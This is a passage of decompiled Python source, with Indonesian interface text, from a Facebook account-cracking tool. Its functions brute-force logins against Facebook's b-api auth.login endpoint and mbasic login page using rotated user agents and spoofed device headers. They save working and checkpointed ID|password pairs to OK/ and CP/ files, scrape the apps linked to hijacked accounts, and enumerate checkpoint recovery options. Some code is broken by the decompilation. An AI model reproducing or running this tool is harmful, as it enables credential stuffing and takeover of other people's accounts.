                if 'checkpoint' in po.cookies.get_dict().keys():
                    if 'ya' in oprek:
                        akun.append(idf + '|' + pw)
                        ceker(idf, pw)
                    elif 'ya' in princp:
                        print('\n')
                        statuscp = f'''[•] ID       : {idf} [•] PASSWORD : {pw}'''
                        statuscp1 = nel(statuscp, 'red', **('style',))
                        cetak(nel(statuscp1, 'CP', **('title',)))
                        open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                        akun.append(idf + '|' + pw)
                        cp += 1
            finally:
                pass
            if 'c_user' in ses.cookies.get_dict().keys():
                headapp = {
                    'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]' }
                if 'no' in taplikasi:
                    coki = po.cookies.get_dict()
                    kuki = ';'.join((lambda .0: [ '%s=%s' % (key, value) for key, value in .0 ])(ses.cookies.get_dict().items()))
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
                    print('\n')
                    statusok = f'''[•] ID       : {idf}\n[•] PASSWORD : {pw}'''
                    statusok1 = nel(statusok, 'green', **('style',))
                    cetak(nel(statusok1, 'OK', **('title',)))
                    ok += 1
            elif 'ya' in taplikasi:
                coki = po.cookies.get_dict()
                kuki = ';'.join((lambda .0: [ '%s=%s' % (key, value) for key, value in .0 ])(ses.cookies.get_dict().items()))
                open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
                user = idf
                infoakun = ''
                session = requests.Session()
                cek2 = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', coki, headapp, **('cookies', 'headers')).text
                cek = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', coki, headapp, **('cookies', 'headers')).text
                infoakun += '\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n'
                apkaktif = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek))
                nok = 1
                for muncul in apkaktif:
                    infoakun += f'''[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n'''
                    nok += 1
                hit = 0
                infoakun += '\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n'
                apkexp = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek2))
                hit = 0
                for muncul in apkexp:
                    hit += 1
                    infoakun += f'''[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n'''
                print('\n')
                statusok = f'''[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[/bold green]\n{infoakun}'''
                statusok1 = nel(statusok, 'green', **('style',))
                cetak(nel(statusok1, '[bold green]OK[/bold green]', **('title',)))
                ok += 1
            continue
            continue
            if requests.exceptions.ConnectionError:
                time.sleep(31)
                continue

            loop += 1
            return None

    
    def cracktouch(idf, pwv):
        global cp, ok, loop
        bi = random.choice([
            u,
            k,
            kk,
            b,
            h,
            hh])
        pers = loop * 100 / len(id2)
        fff = '%'
        print('\r%s [API] %s/%s 👽 [OK/%s] | [CP/%s] 👽 %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), ' ', **('end',))
        sys.stdout.flush()
        ua = random.choice(ugen).replace('\n', '')
        ses = requests.Session()
        for pw in pwv:
            
            try:
                head = {
                    'x-fb-connection-bandwidth': str(random.randint(2000000, 30000000)),
                    'x-fb-sim-hni': str(random.randint(20000, 40000)),
                    'x-fb-net-hni': str(random.randint(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': ua,
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger' }
                resp = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(idf) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', head, **('headers',))
                if 'www.facebook.com' in resp.json()['error_msg']:
                    if 'ya' in oprek:
                        akun.append(idf + '|' + pw)
                        ceker(idf, pw)
                    else:
                        print('\r%s++++ %s|%s ----> CP       ' % (b, idf, pw))
                        open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                        akun.append(idf + '|' + pw)
                        cp += 1
                elif 'session_key' in resp.text and 'EAAA' in resp.text:
                    print('\r%s++++ %s|%s ----> OK       ' % (h, idf, pw))
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
                    ok += 1
            finally:
                pass
            continue
            if requests.exceptions.ConnectionError:
                time.sleep(31)
                continue

            loop += 1
            return None

    
    def crackmbasic(idf, pwv):
        bi = random.choice([
            u,
            k,
            kk,
            b,
            h,
            hh])
        pers = loop * 100 / len(id2)
        fff = '%'
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
        ses = requests.Session()
        sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x))
        sys.stdout.flush()
    # WARNING: Decompyle incomplete

    
    def ceker(idf, pw):
        global cp
        ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
        head = {
            'Host': 'mbasic.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'origin': 'https://mbasic.facebook.com',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
        ses = requests.Session()
        
        try:
            hi = ses.get('https://mbasic.facebook.com')
            ho = sop(ses.post('https://mbasic.facebook.com/login.php', {
                'email': idf,
                'pass': pw,
                'login': 'submit' }, head, True, **('data', 'headers', 'allow_redirects')).text, 'html.parser')
            jo = ho.find('form')
            data = { }
            lion = [
                'nh',
                'jazoest',
                'fb_dtsg',
                'submit[Continue]',
                'checkpoint_data']
            for anj in jo('input'):
                if anj.get('name') in lion:
                    data.update({
                        anj.get('name'): anj.get('value') })
            kent = sop(ses.post('https://mbasic.facebook.com' + str(jo['action']), data, head, **('data', 'headers')).text, 'html.parser')
            print('\r%s++++ %s|%s ----> CP       %s' % (b, idf, pw, x))
            open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
            cp += 1
            opsi = kent.find_all('option')
            if len(opsi) == 0:
                print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
        finally:
            return None
            for opsii in opsi:
                print('\r%s---> %s%s' % (kk, opsii.text, x))
            return None
            if Exception:
                c = None
                
                try:
                    print('\r%s++++ %s|%s ----> CP       %s' % (b, idf, pw, x))
                    print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s' % (u, x))
                    open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                    cp += 1
                finally:
                    c = None
                    del c
                    return None
                    c = None
                    del c



    
    def cek_opsi():
        c = len(akun)
        hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu' % c
        cetak(nel(hu, 'CEK OPSI', **('title',)))
        input(x + '[' + h + '•' + x + '] Mulai')
        cek = '# PROSES CEK OPSI DIMULAI'
        sol().print(mark(cek, 'green', **('style',)))
        love = 0
        for kes in akun:
            
            try:
                
                try:
                    id = kes.split('|')[0]
                    pw = kes.split('|')[1]
                finally:
                    pass
                if IndexError:
                    time.sleep(2)
                    print('\r%s++++ %s ----> Error      %s' % (b, kes, x))
                    print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s' % (u, x))
                continue
                bi = random.choice([
                    u,
                    k,
                    kk,
                    b,
                    h,
                    hh])
                print('\r%s---> %s/%s ---> { %s }%s' % (bi, love, len(akun), id, x), ' ', **('end',))
                sys.stdout.flush()
                ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
                ses = requests.Session()
                header = {
                    'Host': 'mbasic.facebook.com',
                    'cache-control': 'max-age=0',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://mbasic.facebook.com',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'x-requested-with': 'mark.via.gp',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
                hi = ses.get('https://mbasic.facebook.com')
                ho = sop(ses.post('https://mbasic.facebook.com/login.php', {
                    'email': id,
                    'pass': pw,
                    'login': 'submit' }, header, True, **('data', 'headers', 'allow_redirects')).text, 'html.parser')
                if 'checkpoint' in ses.cookies.get_dict().keys():
                    
                    try:
                        jo = ho.find('form')
                        data = { }
                        lion = [
                            'nh',
                            'jazoest',
                            'fb_dtsg',
                            'submit[Continue]',
                            'checkpoint_data']
                        for anj in jo('input'):
                            if anj.get('name') in lion:
                                data.update({
                                    anj.get('name'): anj.get('value') })
                        kent = sop(ses.post('https://mbasic.facebook.com' + str(jo['action']), data, header, **('data', 'headers')).text, 'html.parser')
                        print('\r%s++++ %s|%s ----> CP       %s' % (b, id, pw, x))
                        opsi = kent.find_all('option')
                        if len(opsi) == 0:
                            print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
                        else:
                            for opsii in opsi:
                                print('\r%s---> %s%s' % (kk, opsii.text, x))
                    finally:
                        pass
                    print('\r%s++++ %s|%s ----> CP       %s' % (b, id, pw, x))
                    print('\r%s---> Tidak Dapat Mengecek Opsi%s' % (u, x))
                    if 'c_user' in ses.cookies.get_dict().keys():
                        print('\r%s++++ %s|%s ----> OK       %s' % (h, id, pw, x))
                    else:
                        print('\r%s++++ %s|%s ----> SALAH       %s' % (x, id, pw, x))


                love += 1
            finally:
                continue
                if requests.exceptions.ConnectionError:
                    print('')
                    li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                    sol().print(mark(li, 'red', **('style',)))
                    exit()
                    continue
                dah = '# DONE'
                sol().print(mark(dah, 'green', **('style',)))
                exit()
                return None


    
    def cek_apk(session, cookie):
        w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', {
            'cookie': cookie }, **('cookies',)).text
        sop = BeautifulSoup(w, 'html.parser')
        x = sop.find('form', 'post', **('method',))
        game = (lambda .0: [ i.text for i in .0 ])(x.find_all('h3'))
        if len(game) == 0:
            print(f'''\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.''')
        else:
            for i in range(len(game)):
                print('   %s%s. %s%s' % (H, i + 1, game[i].replace('Ditambahkan pada', ' Ditambahkan pada'), N))
        w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', {
            'cookie': cookie }, **('cookies',)).text
        sop = BeautifulSoup(w, 'html.parser')
        x = sop.find('form', 'post', **('method',))
        game = (lambda .0: [ i.text for i in .0 ])(x.find_all('h3'))
        if len(game) == 0:
            print(f'''\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.''')
            return None
        for i in None(len(game)):
            print('   %s%s. %s%s' % (K, i + 1, game[i].replace('Kedaluwarsa', ' Kedaluwarsa'), N))

    if __name__ == '__main__':
        
        